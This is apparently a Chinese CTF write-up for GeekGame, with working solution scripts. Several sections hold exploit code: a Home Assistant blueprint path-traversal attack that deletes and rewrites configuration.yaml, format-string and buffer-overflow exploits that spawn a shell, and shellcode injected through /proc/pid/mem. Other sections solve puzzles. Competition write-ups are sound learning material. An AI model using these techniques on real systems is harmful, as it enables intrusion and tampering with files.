# 4qwerty7 的 3rd GeekGame 部分WP

反正不需要交，故没记录(一开始做的部分)下来的题目就不写了QAQ。

该 md 无图片依赖。

## 逝界计划

(应该是非预期)

blueprint 的 [save](https://github.com/home-assistant/core/blob/e319b04fdebcc4657ed2a560e072c83bd11e166c/homeassistant/components/blueprint/websocket_api.py#L134) and [delete](https://github.com/home-assistant/core/blob/e319b04fdebcc4657ed2a560e072c83bd11e166c/homeassistant/components/blueprint/websocket_api.py#L173) 可以路径穿越，前者要求必须包含符合格式的 blueprint 内容 且扩展名为 yaml 且文件不存在，因此可以先调用 delete 删除 /config/configuration.yaml 然后复写其内容包含 file 传感器读取 /flag.txt。代码如下

```javascript
// connection to game env
const socket = new WebSocket("wss://prob17-<xxx>.geekgame.pku.edu.cn/api/websocket");
socket.onmessage = (event) => {
  console.log(event.data);
};
socket.onopen = () => {
socket.send(JSON.stringify({"type":"auth","access_token":"<xxxx>"}))
};


// wait for seconds and run
// blueprint can delete any file
socket.send(JSON.stringify({"type":"blueprint/delete","domain":"automation","id":10,"path":"/config/configuration.yaml"}))

// wait for seconds and run
// blueprint can write any file if you have valid blueprint content
let cfg = `blueprint:
  {"name":"test123","description":"Send a notification to a device when a person leaves a specific zone.","domain":"automation","source_url":"https://github.com/home-assistant/core/blob/dev/homeassistant/components/automation/blueprints/notify_leaving_zone.yaml","author":"Home Assistant","input":{"person_entity":{"name":"Person","selector":{"entity":{"filter":[{"domain":["person"]}],"multiple":false}}},"zone_entity":{"name":"Zone","selector":{"entity":{"filter":[{"domain":["zone"]}],"multiple":false}}},"notify_device":{"name":"Device to notify","description":"Device needs to run the official Home Assistant app to receive notifications.","selector":{"device":{"filter":[{"integration":"mobile_app"}],"multiple":false}}}}}
homeassistant:
  media_dirs:
    media: /media
    rc: /proc
  allowlist_external_dirs: ["/"]

sensor:
  - platform: file
    file_path: /flag.txt

# Loads default set of integrations. Do not remove.
default_config:

# Load frontend themes from the themes folder
frontend:
  themes: !include_dir_merge_named themes

automation: !include automations.yaml
script: !include scripts.yaml
scene: !include scenes.yaml
`;
socket.send(JSON.stringify({"type":"blueprint/save","yaml":cfg,"domain":"automation","id":13,"path":"/config/configuration.yaml"}))

// restart server by develop options and then file is flag
```

(据[官方](https://www.home-assistant.io/security#non-qualifying-vulnerabilities)答复这不属于漏洞且可以公开)

## Z 公司的服务器

调用 modem 库即可，通过 nc

```python
#!/usr/bin/python2
from __future__ import print_function
import os, sys
from pwn import *
sys.path.append(os.getcwd())
from modem import *

rr = remote('prob05.geekgame.pku.edu.cn', 10005)

rr.sendlineafter('Please input your token: ', '<token>')

def getc(cnt, timeout):
    return rr.recvn(1)

def putc(data, timeout):
    rr.send(data)

zmodem = ZMODEM(getc, putc)
nfiles = zmodem.recv(os.getcwd(), retry=8)
print(nfiles)
```

通过 TCP

```python
#!/usr/bin/python2
from __future__ import print_function
import os, sys
sys.path.append(os.getcwd())
from modem import *

buffer = open('inp.txt', 'r').read().replace('\r','').replace('\n','').decode('hex')
cur = 0
def getc(cnt, timeout):
    global cur
    ret = buffer[cur:cur+cnt]
    cur += cnt
    return ret.decode('latin-1')

def putc(data, timeout):
    pass # print(data, end='')

zmodem = ZMODEM(getc, putc)
nfiles = zmodem.recv(os.getcwd(), retry=8)
print(nfiles)
```

## Dark Room

手玩，然后help抽卡

```python
from pwn import *
import time
from tqdm import *
payload = """
n
n
e
pickup key
w
s
s
e
e
e
pickup trinket
w
s
usewith key door
s
s
n
w
w
w
n
pickup key
s
e
e
e
n
n
w
w
n
n
w
w
usewith key door
use trinket
""".strip().replace('\r', '').splitlines()

cnt = 0
while True:
    print(cnt)
    cnt += 1
    rr = remote('prob16.geekgame.pku.edu.cn', 10016)
    rr.sendlineafter('Please input your token: ', '<token>')
    rr.sendlineafter(b'[...]: ', b'newgame')
    name = 'aa'
    rr.sendlineafter(b'[...]: ', name.encode())
    rr.sendlineafter(b' (y/n) ', b'y')
    #context.log_level = 'debug'

    for line in tqdm(payload):
        rr.sendlineafter(b'[aa]: ', line.encode())
    
    while True:
        rr.sendlineafter(b'[aa]: ', b'h')
        rr.recvuntil(b'] (')
        sanity = int(rr.recvuntil(b'%)')[:-2].decode().strip())
        print(sanity)
        if sanity >= 117:
            break
        if sanity < 80:
            break
    
    rr.sendlineafter(b'[aa]: ', b'n')
    ret = rr.recvuntil(b'[...]:')
    print(ret.decode())
    if b'{' in ret:
        break
    rr.close()
    time.sleep(2)
```

时间侧信道

实际上是time.sleep是我没想到的QAQ

```python
from pwn import *
import time
from tqdm import *
payload = """
n
n
e
pickup key
w
s
s
e
e
e
pickup trinket
w
s
usewith key door
s
s
n
w
w
w
n
pickup key
s
e
e
e
n
n
w
w
n
n
w
w
usewith key door
use trinket
i
h
h
h
h
s
getflag
""".strip().replace('\r', '').splitlines()

rr = remote('prob16.geekgame.pku.edu.cn', 10016)
rr.sendlineafter('Please input your token: ', '<token>')
rr.sendlineafter(b'[...]: ', b'newgame')
name = 'aa'
rr.sendlineafter(b'[...]: ', name.encode())
rr.sendlineafter(b' (y/n) ', b'y')
#context.log_level = 'debug'

for line in tqdm(payload):
    rr.sendlineafter(b'[aa]: ', line.encode())
context.log_level = 'debug'
cc = 0b110011011000110000101100111011110110101100101101111011101010101111101110011001100000110110001010110010001010110010001011111011101000110100000110001010100110101111101100011011010000100000101001100010011000100010101001110011001110100010101011111011001010111100001100011010001010110110001101100010001010100111001110100010011000111100101111101
# flag{You_s0lVEd_th1S_chALLENgE_excEllENtLy}
for i in range(340):
    rr.sendlineafter(b'Guess my public key (give me a number):', str(cc + i*(2**339)).encode())

rr.interactive()
exit()
context.log_level = 'debug'
import time
cc = 0
x = 1
rr.recvuntil(b'Guess my public key (give me a number):')
for i in range(341):
    cur = time.time()
    rr.sendline(b'10757315172810435758108198281845061826086689691391830730625032693522421099366787141702644056776781656826')
    rr.recvuntil(b'Guess my public key (give me a number):')
    delta = time.time() - cur
    cc += x * (1 if delta >= 0.5 else 0)
    x *= 2
    print(i, ",", delta, bin(cc))

#time.sleep(2)
```

## 麦恩·库拉夫特

用NBTUtil导出所有region，`grep -r "text" *.json` 找到两个flag

```json
...
r.0.0.mca.json:   | |   + Text1: {"text":"flag{Exp0rIng"}
r.0.0.mca.json:   | |   + Text2: {"text":"_M1necRaft"}
r.0.0.mca.json:   | |   + Text3: {"text":"_i5_Fun}"}
...
Binary file r.1.-1.mca.json matches
r.6.-4.mca.json:   | |   + Text1: {"text":"flag{pAR3inG"}
r.6.-4.mca.json:   | |   + Text2: {"text":"_ANvI1_iS"}
r.6.-4.mca.json:   | |   + Text3: {"text":"eAaasY2}"}
r.6.-4.mca.json:   | |   + Text4: {"text":""}
```

## 初学 C 语言

fmtstr bug

```python
from pwn import *

context(os='linux', arch='amd64')
"""
def exec_fmt(payload):
    p = process('./pwn')
    p.sendlineafter(b'Please input your instruction:\n', payload)
    ret = p.recvline()
    print(ret)
    p.close()
    return ret

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(offset)
"""
offset = 34
#rr = process('./pwn')
rr = remote('prob09.geekgame.pku.edu.cn', 10009)
rr.sendlineafter('Please input your token: ', '<token>')
#print(rr.pid)

def do(content):
    rr.sendlineafter(b'Please input your instruction:\n', content.encode() if isinstance(content, str) else content)
    return rr.recvline()

stack = int(do('%p').strip(), 16) + 0x498
print(hex(stack))
base = int(do(f'%{18+0x498//8}$p').strip(), 16) - 0xA3FD
info('base: 0x%x', base)
from rop import gen_rop
rop_data = gen_rop(base)

for i in range(0, len(rop_data), 8):
    print(hex(stack + i))
    do(fmtstr_payload(offset, {stack + i: u64(rop_data[i:i+8])}))
#pause()
do('%p'*256)
rr.interactive()
```

## Baby Stack

int overflow

```python
from pwn import *

context(os='linux', arch='amd64')

rr = process('./challenge1')
rr = remote('prob10.geekgame.pku.edu.cn', 10010)
rr.sendlineafter('Please input your token: ', '<token>')
#print(rr.pid)
rr.sendlineafter(b'or EOF included!)', b'0')
pause()
rr.sendline(b'a' * 0x78 + p64(0x40136C) + p64(0x4011B6))
rr.interactive()
```

又是fmtstr bug

```python
from pwn import *
import os

context(os='linux', arch='amd64', log_level='debug')
#context(os='linux', arch='amd64')

def run_process():
    return process('./challenge2', preexec_fn=lambda:os.chroot('./'))

"""
def exec_fmt(payload):
    p = run_process()
    p.sendlineafter(b'(less than 0x20 characters)\n', b'123')
    p.sendlineafter(b'capture it?:', payload)
    p.recvuntil(b'so you want to \n')
    ret = p.recvline()
    print(ret)
    p.close()
    return ret

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
print(offset)
exit()
"""
elf = ELF('./challenge2')
libc = ELF('./libc.so.6')

offset = 6
#rr = run_process()
rr = remote('prob11.geekgame.pku.edu.cn', 10011)
rr.sendlineafter('Please input your token: ', '<token>')
#print(rr.pid)

rr.sendlineafter(b'(less than 0x20 characters)\n', b'%3$p')
rr.recvuntil(b'this is your flag: ')
libc.address = int(rr.recvline().strip().decode(), 16) - 0x114a37
info(f"libc 0x{libc.address:x}")
rr.sendlineafter(b'capture it?:', fmtstr_payload(offset, {elf.got['puts']: libc.sym['system']}))
rr.sendlineafter(b' and your flag again? :', b'/bin/sh')
rr.interactive()
exit()
```

## 绝妙的多项式

baby 直接列方程求解($O(n^{log_{bla}{bla}})>O(n^2)$是什么，可以吃吗，doge)

```python
from sage.all import *
ans = [  3318,
382207753,
141261786,
100396702,
617742273,
385313506,
368063237,
562832377,
857094849,
53657966,
669496487,
605913203,
29815074,
762568211,
133958153,
223410103,
39956957,
937802638,
229055941,
767816204,
13414714,
795034084,
184947163,
171452954,
272370098,
484621960,
430570773,
639750081,
695262892,
144991146,
292318513,
573477240,
867813853,
798543925,
12064634,
874910184]
FF = GF(998244353)
A = matrix(FF, 36, 36)
for i in range(1, 37):
    x = FF(1)
    for j in range(36):
        A[i-1, j] = x
        x *= i

b = vector(FF, ans)
print(bytes([int(x) for x in A.solve_right(b)]))
```

easy调试器跳到hard的ntt inv，传入easy的被比对的答案，即可得到flag。

hard直接sagemath(算法是什么我不清楚，反正直接可以算，doge)

```python
from sage.all import *
b = [119, 101, 108, 99, 111, 109, 101, 32, 116, 111, 32, 116, 104, 101, 32, 119, 111, 114, 108, 100, 32, 111, 102, 32, 112, 111, 108, 121, 110, 111, 109, 105, 97, 108]
c = [b[i%34] for i in range(64)]
d = [12138, 23154, 33467, 43816, 57530, 66609, 77128, 80804, 92175, 105292, 108483, 118540, 131954, 142177, 136857, 152451, 156192, 168826, 175099, 187544, 186035, 203933, 213144, 216764, 224357, 238205, 246551, 252961, 272640, 272928, 289956, 292370, 301678, 307801, 329797, 329318, 345550, 349216, 369630, 378192, 373474, 366332, 365461, 368764, 359672, 359946, 359613, 372215, 353554, 362287, 364071, 372007, 365423, 365794, 367037, 371337, 366876, 358828, 357300, 359051, 371182, 363212, 371618, 373912]
FF = GF(998244353)
PR = FF['xx']
QR = PR.quotient(PR.gens()[0]**64,'x')
x, = QR.gens()
dp=sum([v*x**i for i,v in enumerate(d)])
cp=sum([v*x**i for i,v in enumerate(c)])
print(bytes([int(v)for v in (dp / cp).list()]))
```

## 禁止执行，启动

找到sleep返回的那句话，趁sleep的时候写进去shellcode

```python
from pwn import *
from base64 import *
context.os = 'linux'
context.arch = 'amd64'
code = """    mov rax, 548   # __NR_get_flag
    xor rdi, rdi   # id = 0
    mov rsi, rsp   # buf = %rsp
    syscall

    mov rax, 1     # __NR_write
    mov rdi, rax   # fd = STDOUT_FILENO
    mov rsi, rsp   # buf = %rsp
    mov rdx, 32    # len = 32
    syscall
"""
asmed = b64encode(asm(code))
print(asmed)
context.log_level = 'debug'

def print_code(xx, yy):
    print(yy.decode())

#rr = process('./run.sh')
rr = remote('prob07.geekgame.pku.edu.cn', 10007)
rr.sendlineafter('Please input your token: ', '<token>')
#rr.sendlineafter = print_code
rr.sendlineafter(b'Enter your choice:', b'2')

rr.sendlineafter(b'/ $', b'cd tmp; touch c')
for v in range(0, len(asmed), 20):
    rr.sendlineafter(b'/tmp $', b'echo ' + asmed[v:v+20] + b' >> c')

rr.sendlineafter(b'/tmp $', b'cat c | base64 -d > d')
rr.sendlineafter(b'/tmp $', b'truncate -s 4096 d')
rr.sendlineafter(b'/tmp $', b'sleep 2 > /tmp/ccc 2>/tmp/cc2 &')
rr.sendlineafter(b'/tmp $', f'dd if=/tmp/d of=/proc/`pidof sleep`/mem bs=1 seek={0x4d3682} count=128; pidof sleep'.encode())
#context.log_level = 'error'
rr.interactive()
```

patch 掉ld.so的openat，返回memfd的fd，然后memfd execveat执行它

hook open 的 shellcode 关键代码摘录（写在ehframe里，openat跳过来）

```c
__attribute__((section(".text.prologue"))) int main(const char *filename, int flags, int a3) {
	int ld_fd = open(filename, flags, a3);
	if (ld_fd < 0) {
		return -1;
	}
	int memfd_fd = syscall(SYS_memfd_create, "rwxp", 0);
	if (memfd_fd < 0) {
		return -1;
	}
	copy_to(ld_fd, memfd_fd);
	syscall(SYS_lseek, memfd_fd, 0, SEEK_SET);
	close(ld_fd);
	return memfd_fd;
}
```

execve的shellcode关键代码摘录(libtest.buffer是存放了上面的shellcode的文件)

```c
EMBED_FILE(magic_desired_file, "libtest.buffer")

void copy_to(int from_fd, int to_fd) {
	char buffer[4096];
	while (1) {
		int len = read(from_fd, buffer, sizeof(buffer));
		if (len <= 0) break;
		write(to_fd, buffer, len);
	}
}

const char *argvs[] = {
	"./ld-linux-x86-64.so.2",
	"--preload",
	"./libc.so.6:./libgcc_s.so.1",
	"--argv0",
	"./hard_flag",
	"./hard_flag",
	0
};

const char *envp[] = {
	0
};

const unsigned char pbuf[] = {0xE9, 0x43, 0xBC, 0x00, 0x00};


__attribute__((section(".text.prologue"))) void main() {
	int ld_fd = open("/tmp/ld-linux-x86-64.so.2", O_RDONLY);
	if (ld_fd < 0) {
		debug("open ld failed");
		return;
	}
	int memfd_fd = syscall(SYS_memfd_create, "rwxp", 0);
	if (memfd_fd < 0) {
		debug("open ld failed");
		return;
	}
	copy_to(ld_fd, memfd_fd);
	close(ld_fd);
	unsigned char perm = 7;
	syscall(SYS_lseek, memfd_fd, 0x44, SEEK_SET);
	write(memfd_fd, &perm, 1);
	syscall(SYS_lseek, memfd_fd, 0xb4, SEEK_SET);
	write(memfd_fd, &perm, 1);
	syscall(SYS_lseek, memfd_fd, 0xec, SEEK_SET);
	write(memfd_fd, &perm, 1);
	syscall(SYS_lseek, memfd_fd, 0x212d4, SEEK_SET);
	write(memfd_fd, pbuf, sizeof(pbuf));
	void *magic_desired_file = get_magic_desired_file_addr();
	debug("magic_desired_file_ptr %p", magic_desired_file);
	debug("magic_desired_file_size %p", *(size_t *)magic_desired_file);
	syscall(SYS_lseek, memfd_fd, 0x2CF1C, SEEK_SET);
	write(memfd_fd, (size_t *)magic_desired_file + 1, *(size_t *)magic_desired_file);
	int son = syscall(SYS_fork);
	if (son < 0) {
		debug("fork failed");
		return;
	}
	if (son == 0) {
		for (int i = 0; argvs[i]; i++) {
			size_t data = (size_t)argvs[i] + (size_t)main;
			write_ro_mem(argvs + i, &data, sizeof(data));
		} // 处理一些gcc编译shellcode非得重定位的部分
		debug("error execveat %d", syscall(SYS_execveat, memfd_fd, "", argvs, envp, AT_EMPTY_PATH));
		return;
	}
}
```

提交脚本

```python
from pwn import *
from base64 import *
from tqdm import *
import time
context.os = 'linux'
context.arch = 'amd64'

asmed = b64encode(open('prepare_shellcode/shellcode2loader_x86_64.bin','rb').read())
#print(asmed)


def print_code(xx, yy):
    print(yy.decode())

#rr = process('./run.sh')
rr = remote('prob07.geekgame.pku.edu.cn', 10007)
rr.sendlineafter('Please input your token: ', '<token>')
#rr.sendlineafter = print_code
rr.sendlineafter(b'Enter your choice:', b'2')

rr.sendlineafter(b'/ $', b'cd tmp; touch c')
for v in trange(0, len(asmed), 20):
    rr.sendlineafter(b'/tmp $', b'echo ' + asmed[v:v+20] + b' >> c')

rr.sendlineafter(b'/tmp $', b'cat c | base64 -d > d')
rr.sendlineafter(b'/tmp $', b'truncate -s 4096 d')
rr.sendlineafter(b'/tmp $', b'sleep 2 > /tmp/ccc 2>/tmp/cc2 &')
rr.sendlineafter(b'/tmp $', f'dd if=/tmp/d of=/proc/`pidof sleep`/mem bs=1 seek={0x4d3682} count=4096; pidof sleep'.encode())
time.sleep(4)
rr.sendlineafter(b'/tmp $', b'cat cc2')
print(rr.recvuntil(b'/tmp $'))
rr.sendline(b'cat ccc')
print(rr.recvuntil(b'/tmp $'))
#context.log_level = 'error'
rr.close()
```

## 关键词过滤喵，谢谢喵

超过4000给个4000并去掉，超过3000给个3000并去掉，以此类推 $10log_{10}(len)$ 次

```python
ans = []
spliter = 'efwnaifh'
ans.append(f'把【^([\\s\\S]*)$】替换成【0000{spliter}\\1】喵')
def gen(cc,x):
    ans.append(f'如果看到【^([\\s\\S]*){spliter}([\\s\\S]'+'{'+str(cc)+'}'+f')([\\s\\S]*)$】就跳转到【a{cc}】喵')
    ans.append(f'如果看到【^([\\s\\S]*)$】就跳转到【b{cc}】喵')
    ans.append(f'a{cc}：')
    ans.append(f'把【^([\\s\\S]'+'{'+str(x)+'}'+f')0([\\s\\S]'+'{'+str(3-x)+'}'+f'){spliter}([\\s\\S]*)([\\s\\S]'+'{'+str(cc)+'}'+f')$】替换成【\\g<1>{str(cc)[0]}\\g<2>{spliter}\\g<3>】喵')
    ans.append(f'b{cc}：')
for i in range(1, 5)[::-1]:
    gen(i*1000,0)

for i in range(1, 10)[::-1]:
    gen(i*100,1)

for i in range(1, 10)[::-1]:
    gen(i*10,2)

for i in range(1, 10)[::-1]:
    gen(i,3)
ans.append(f'把【{spliter}】替换成【】喵')
ans.append(f'重复把【^0(\\d)】替换成【\\1】喵')
ans.append('谢谢喵')
open('code1.txt','wb').write('\n'.join(ans).encode())
```

写了句能把=xx长度的内容和比他大的排好的代码，剩下的交给不完整的数据集(doge,该代码显然可以被hack)

```python
ans = []
spliter = 'efwnaifh'
ans.append(r'把【\r】替换成【】喵')
ans.append(r'重复把【\n\n】替换成【\n】喵')
ans.append(r'把【([\s\S]*)】替换成【\n\1\n】喵')
for i in range(1, 600):
    ans.append(r'重复把【\n(.{'+str(i)+r'}.+)\n(([\s\S]*\n)?)(.{'+str(i)+r'})\n】替换成【\n\4\n\3\n\1\n】喵')
ans.append(r'重复把【\n\n】替换成【\n】喵')
ans.append(r'重复把【^\n】替换成【】喵')
ans.append(r'谢谢喵')

open('code2.txt','wb').write('\n'.join(ans).encode())
```

brainfuck python的re不支持递归差评QAQ 实现二进制加法、假设内存块只有有限数量个啥的即可。

该程序在算出负数等部分情况会输出 `坏了喵，{原因}喵` (doge)。

(注意 Brainfuck 程序中除 `>`、`<`、`+`、`-`、`.`、`[` 和 `]` 以外的字符都应该被忽略 这点有点坑)

```python
import re

ans = []
begin_spliter = '一'
end_spliter = '二'
out_spliter = '三'
ans.append(r'重复把【\s】替换成【】喵')
ans.append(r'把【^(.*)$】替换成【'+begin_spliter+r'！\g<1>'+end_spliter+out_spliter+r'】喵')
ans.append(r'继续追加：')
ans.append(r'把【^(.*)$】替换成【0S\g<1>S0】喵')
#ans.append(f'调试标签【1】喵')
ans.append(r'如果看到【^(0S){20}(.*)(S0){20}$】就跳转到【循环执行首】喵')
ans.append(f'如果看到【.*】就跳转到【继续追加】喵')
ans.append(r'循环执行首：')

ans.append(r'如果没看到【^(.*)'+begin_spliter+r'(.*)！\.(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】就跳转到【不是输出】喵')
for i in range(32, 123):
    ans.append(r'把【^('+bin(i)[2:]+r'S.*)'+begin_spliter+r'(.*)！\.(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<1>'+begin_spliter+r'\g<2>.！\g<3>'+end_spliter+r'\g<4>'+(chr(i) if chr(i) != '\\' else '\\\\')+out_spliter+r'\g<5>】喵')

ans.append(r'把【^('+bin(10)[2:]+r'S.*)'+begin_spliter+r'(.*)！\.(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<1>'+begin_spliter+r'\g<2>.！\g<3>'+end_spliter+r'\g<4>换行'+out_spliter+r'\g<5>】喵')
ans.append(r'把【^('+bin(13)[2:]+r'S.*)'+begin_spliter+r'(.*)！\.(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<1>'+begin_spliter+r'\g<2>.！\g<3>'+end_spliter+r'\g<4>回车'+out_spliter+r'\g<5>】喵')
ans.append(r'不是输出：')
ans.append(r'把【^([01]*)S(.*)'+begin_spliter+r'(.*)！\>(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<2>'+begin_spliter+r'\g<3>>！\g<4>'+end_spliter+r'\g<5>'+out_spliter+r'\g<6>S\g<1>】喵')
ans.append(r'把【^(.*)'+begin_spliter+r'(.*)！\<(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)S([01]*)$】替换成【\g<6>S\g<1>'+begin_spliter+r'\g<2><！\g<3>'+end_spliter+r'\g<4>'+out_spliter+r'\g<5>】喵')

ans.append(r'把【^([01]*)S(.*)'+begin_spliter+r'(.*)！\+(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<1>US\g<2>'+begin_spliter+r'\g<3>+！\g<4>'+end_spliter+r'\g<5>'+out_spliter+r'\g<6>】喵')
ans.append(r'加法首：')
ans.append(r'把【^([01]*)0U(.*)$】替换成【\g<1>1\g<2>】喵')
ans.append(r'把【^([01]*)1U(.*)$】替换成【\g<1>U0\g<2>】喵')
ans.append(r'把【^U(.*)$】替换成【1\g<1>】喵')
ans.append(r'如果看到【^([01]*)U(.*)$】就跳转到【加法首】喵')
ans.append(r'把【^([01]*)S(.*)'+begin_spliter+r'(.*)！\-(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<1>DS\g<2>'+begin_spliter+r'\g<3>-！\g<4>'+end_spliter+r'\g<5>'+out_spliter+r'\g<6>】喵')
ans.append(r'减法首：')
ans.append(r'把【^([01]*)1D(.*)$】替换成【\g<1>0\g<2>】喵')
ans.append(r'把【^([01]*)0D(.*)$】替换成【\g<1>D1\g<2>】喵')
ans.append(r'把【^D(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【D\g<1>'+end_spliter+r'坏了喵，负数了喵'+out_spliter+r'\g<3>】喵')
ans.append(r'如果看到【^D(.*)$】就跳转到【结束执行】喵')
ans.append(r'如果看到【^([01]*)D(.*)$】就跳转到【减法首】喵')
ans.append(r'重复把【^0+([01]+)S(.*)$】替换成【\g<1>S\g<2>】喵')

ans.append(r'把【^(.*)'+begin_spliter+r'(.*)！\](?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【0X\g<1>'+begin_spliter+r'\g<2>！]\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵')
ans.append(r'回退首：')
ans.append(r'把【^([01]*)X(.*)'+begin_spliter+r'(.*)([^\[\]]+)！(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>X\g<2>'+begin_spliter+r'\g<3>！\g<4>\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # 非[]
ans.append(r'把【^0X(.*)'+begin_spliter+r'(.*)\[！(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>'+begin_spliter+r'\g<2>！[\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # 结束条件
ans.append(r'把【^([01]*1[01]*)X(.*)'+begin_spliter+r'(.*)\[！(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>DX\g<2>'+begin_spliter+r'\g<3>！[\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # back -1

ans.append(r'回退减法首：')
ans.append(r'把【^([01]*)1D(.*)$】替换成【\g<1>0\g<2>】喵')
ans.append(r'把【^([01]*)0D(.*)$】替换成【\g<1>D1\g<2>】喵')
ans.append(r'把【^D(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【D\g<1>'+end_spliter+r'坏了喵，回退时括号不匹配'+out_spliter+r'\g<3>】喵')
ans.append(r'如果看到【^D(.*)$】就跳转到【结束执行】喵')
ans.append(r'如果看到【^([01]*)D(.*)$】就跳转到【回退减法首】喵')
ans.append(r'重复把【^0+([01]+)X(.*)$】替换成【\g<1>X\g<2>】喵')

ans.append(r'把【^([01]*)X(.*)'+begin_spliter+r'(.*)\]！(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>UX\g<2>'+begin_spliter+r'\g<3>！]\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # back +1
ans.append(r'回退加法首：')
ans.append(r'把【^([01]*)0U(.*)$】替换成【\g<1>1\g<2>】喵')
ans.append(r'把【^([01]*)1U(.*)$】替换成【\g<1>U0\g<2>】喵')
ans.append(r'把【^U(.*)$】替换成【1\g<1>】喵')
ans.append(r'如果看到【^([01]*)U(.*)$】就跳转到【回退加法首】喵')
#ans.append(f'调试标签【4】喵')
ans.append(r'如果看到【^([01]*)X(.*)$】就跳转到【回退首】喵')

ans.append(r'把【^0S(.*)'+begin_spliter+r'(.*)！\[(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【0Y0S\g<1>'+begin_spliter+r'\g<2>[！\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵')
ans.append(r'前进首：')
ans.append(r'把【^([01]*)Y(.*)'+begin_spliter+r'(.*)！([^\[\]]*)(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>Y\g<2>'+begin_spliter+r'\g<3>\g<4>！\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # 非[]
#ans.append(f'调试标签【41】喵')
ans.append(r'把【^0Y(.*)'+begin_spliter+r'(.*)！\](?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>'+begin_spliter+r'\g<2>]！\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # 结束条件
#ans.append(f'调试标签【42】喵')
ans.append(r'把【^([01]*1[01]*)Y(.*)'+begin_spliter+r'(.*)！\](?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>DY\g<2>'+begin_spliter+r'\g<3>]！\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # back -1

ans.append(r'前进减法首：')
ans.append(r'把【^([01]*)1D(.*)$】替换成【\g<1>0\g<2>】喵')
ans.append(r'把【^([01]*)0D(.*)$】替换成【\g<1>D1\g<2>】喵')
ans.append(r'把【^D(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【D\g<1>'+end_spliter+r'坏了喵，前进时括号不匹配'+out_spliter+r'\g<3>】喵')
ans.append(r'如果看到【^D(.*)$】就跳转到【结束执行】喵')
ans.append(r'如果看到【^([01]*)D(.*)$】就跳转到【前进减法首】喵')
ans.append(r'重复把【^0+([01]+)Y(.*)$】替换成【\g<1>Y\g<2>】喵')

ans.append(r'把【^([01]*)Y(.*)'+begin_spliter+r'(.*)！\[(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>UY\g<2>'+begin_spliter+r'\g<3>[！\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵') # back +1
ans.append(r'前进加法首：')
ans.append(r'把【^([01]*)0U(.*)$】替换成【\g<1>1\g<2>】喵')
ans.append(r'把【^([01]*)1U(.*)$】替换成【\g<1>U0\g<2>】喵')
ans.append(r'把【^U(.*)$】替换成【1\g<1>】喵')
ans.append(r'如果看到【^([01]*)U(.*)$】就跳转到【前进加法首】喵')
#ans.append(f'调试标签【3】喵')
ans.append(r'如果看到【^([01]*)Y(.*)$】就跳转到【前进首】喵')

ans.append(r'把【^([01]*)1([01]*)S(.*)'+begin_spliter+r'(.*)！\[(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<1>1\g<2>S\g<3>'+begin_spliter+r'\g<4>[！\g<5>'+end_spliter+r'\g<6>'+out_spliter+r'\g<7>】喵')

ans.append(r'把【^(.*)'+begin_spliter+r'(.*)！([^\[\]\.\<\>\+\-])(?P<after>.*)'+end_spliter+r'(?P<out>.*)'+out_spliter+r'(?P<extra>.*)$】替换成【\g<1>'+begin_spliter+r'\g<2>\g<3>！\g<after>'+end_spliter+r'\g<out>'+out_spliter+r'\g<extra>】喵')


#ans.append(f'调试标签【2】喵')
ans.append(r'如果看到【^(.*)'+begin_spliter+r'(.*)！'+end_spliter+r'(.*)$】就跳转到【结束执行】喵')
ans.append(f'如果看到【.*】就跳转到【循环执行首】喵')
ans.append(r'结束执行：')
ans.append(r'把【^(.*)'+begin_spliter+r'(.*)'+end_spliter+r'(.*)'+out_spliter+r'(.*)$】替换成【\g<3>】喵')
ans.append(r'把【回车】替换成【\r】喵')
ans.append(r'把【换行】替换成【\n】喵')
ans.append(r'谢谢喵')

open('code3.txt','wb').write('\n'.join(ans).encode())
```

## 未来磁盘

第一问直接写个程序管道读取

```c
#include <unistd.h>

int main() {
	char buf[4096];
	unsigned long long *x = (unsigned long long*)buf;
	unsigned long long cc = 0;
	int ticks = 0;
	while (1) {
		int cnt = read(0, buf, sizeof(buf));
